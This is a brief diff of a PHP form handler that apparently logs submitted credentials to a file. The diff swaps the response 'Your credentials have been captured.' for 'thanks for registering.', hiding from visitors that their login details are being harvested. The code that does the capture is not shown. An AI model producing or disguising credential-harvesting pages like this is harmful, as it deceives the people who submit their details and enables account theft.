@@ -16,7 +16,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     fclose($file);
 
     // Notify the user
-    echo "<h1>Your credentials have been captured.</h1>";
+    echo "<h1>thanks for registering.</h1>";
 } else {
     echo "<h1>Invalid request method.</h1>";
 }
